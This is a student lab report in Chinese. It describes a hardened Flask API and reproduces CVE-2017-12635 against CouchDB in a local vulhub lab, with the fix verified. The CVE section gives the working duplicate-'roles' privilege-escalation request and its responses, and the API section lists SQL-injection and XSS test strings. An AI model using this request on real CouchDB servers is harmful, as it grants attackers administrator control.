# 信息安全实验一

## 基于 Flask 的安全 API 与 CVE-2017-12635 复现

| 项目 | 内容 |
|---|---|
| 变体 | CVE-2017-12635 |
| 姓名 | Guo Ruihao |
| HDU 学号 | 23320309 |
| 小组 | 无 |
| 日期 | 2026-10-20 |
| 仓库 | <https://github.com/zhangyu7777777/InformationSecurity_23320309> |

## 一、文件说明

```text
app.py                  后端代码
requirements.txt        需要安装的包
README.md               实验说明和报告
.github/workflows/      GitHub Actions
screenshots/            实验截图
```

## 二、运行方法

```powershell
py -3 -m venv .venv
.\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
python app.py
```

程序运行在 `http://127.0.0.1:5000`。

数据库用 SQLite，第一次运行会自动建表，并创建两个测试用户：

| 用户名 | 密码 | 角色 |
|---|---|---|
| alice | 123456 | admin |
| bob | 123456 | user |

## 三、接口

### 1. 登录

```bash
curl -X POST http://127.0.0.1:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"login":"alice","password":"123456"}'
```

返回：

```json
{"token":"..."}
```

### 2. 获取数据

```bash
curl http://127.0.0.1:5000/api/data \
  -H "Authorization: Bearer 这里填token"
```

不带 token 会返回 401。加 `?q=关键词` 可以搜索。

### 3. 添加数据

```bash
curl -X POST http://127.0.0.1:5000/api/data \
  -H "Authorization: Bearer 这里填token" \
  -H "Content-Type: application/json" \
  -d '{"title":"标题","body":"内容"}'
```

## 四、安全措施

1. **SQL 注入**：SQL 里用 `?` 占位符，例如
   `SELECT * FROM users WHERE username = ?`，不拼接用户输入。
2. **XSS**：返回数据前用 `html.escape()` 转义。
3. **密码**：用 bcrypt 加密后存数据库，不存明文。
4. **登录**：登录成功后发 JWT，访问受保护接口要带
   `Authorization: Bearer <token>`。token 用 HS256 验证。

我测试了 SQL 注入字符串 `' OR 1=1 --`，搜索结果是空列表；提交
`<script>alert(1)</script>` 后，返回内容里没有可执行的 `<script>`。

## 五、CI

GitHub Actions 每次 push 会自动运行：

```text
python -c "import app"
bandit app.py
pip-audit -r requirements.txt
```

结果：

```text
Bandit: No issues identified
pip-audit: No known vulnerabilities found
```

流水线地址：

<https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39357288884>

## 六、CVE-2017-12635

### 1. 漏洞简介

CVE-2017-12635 是 CouchDB 2.1.1 之前的权限提升漏洞。

CouchDB 检查权限时用 Erlang 的 JSON 解析器，保存用户时用 JavaScript 的
解析器。如果请求里有重复的 `roles` 键，两个解析器会得到不同的值：

```json
{
  "roles": ["_admin"],
  "roles": []
}
```

权限检查看到第一个 `["_admin"]`，保存时看到第二个 `[]`，所以普通用户能
把自己创建成管理员。

### 2. 启动漏洞环境

```bash
git clone --depth 1 https://github.com/vulhub/vulhub.git
cd vulhub/couchdb/CVE-2017-12635
docker compose up -d
```

服务地址是 `http://127.0.0.1:5984`。

Windows 下如果 init 容器报 `$'\r': command not found`，说明 `init.sh`
是 CRLF 换行。用编辑器把它改成 LF，然后执行
`docker compose restart initd`。

### 3. 复现

用 Postman 发送第一个请求（正常设置管理员，应该被拒绝）：

```text
PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub
Content-Type: application/json

{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "password": "vulhub"
}
```

结果：

```text
403 Forbidden
{"error":"forbidden","reason":"Only _admin may set roles"}
```

再发一个带两个 `roles` 的请求：

```text
PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub
Content-Type: application/json

{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulhub"
}
```

结果：

```text
201 Created
```

登录新用户：

```bash
curl -u vulhub:vulhub http://127.0.0.1:5984/_session
```

```json
{"ok":true,"userCtx":{"name":"vulhub","roles":["_admin"]},...}
```

再用这个用户创建数据库：

```bash
curl -i -u vulhub:vulhub -X PUT http://127.0.0.1:5984/evil_db
```

返回 201，说明已经拿到管理员权限。

### 4. 原因分析

这个漏洞是**两个 JSON 解析器对重复键的处理不一致**。

同一个请求，在权限检查阶段被解析成管理员，在保存阶段却被解析成普通用户。
代码逻辑本身看起来没有问题，但两个组件对同一份数据的理解不同，最后就产生
了权限绕过。

### 5. 修复

直接用 CouchDB 2.1.1 的镜像启动一个修复版：

```bash
docker run -d --name couchdb-fixed -p 5985:5984 \
  -e COUCHDB_USER=admin -e COUCHDB_PASSWORD=password \
  couchdb:2.1.1

curl -X PUT http://admin:password@127.0.0.1:5985/_users
```

修复版地址是 `http://127.0.0.1:5985`。

### 6. 修复验证

再发同样的重复 `roles` 请求：

```text
PUT http://127.0.0.1:5985/_users/org.couchdb.user:vulhub
Content-Type: application/json

{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulhub"
}
```

2.1.1 仍然返回 201，但登录后角色是空的：

```json
{"ok":true,"userCtx":{"name":"vulhub","roles":[]},...}
```

用这个用户创建数据库会返回 401。

普通用户注册仍然正常：

```text
PUT http://127.0.0.1:5985/_users/org.couchdb.user:normaluser

{
  "type": "user",
  "name": "normaluser",
  "roles": [],
  "password": "normalpass"
}
```

返回 201，登录后角色是 `[]`。说明修复后普通功能没有被破坏。

## 七、截图

![漏洞复现](screenshots/cve-before.png)

![修复验证](screenshots/cve-after.png)

![GitHub Actions](screenshots/ci-success.png)

## 八、总结

这次实验让我练习了 Flask 写接口、JWT 登录、bcrypt 存密码，以及防 SQL 注入
和 XSS。

CVE 部分让我理解了：就算代码逻辑看起来没问题，不同组件对同一个输入的理解
不一致，也可能造成权限绕过。修复时升级版本最直接，但升级后还要测试普通用户
注册，确认功能没有被破坏。
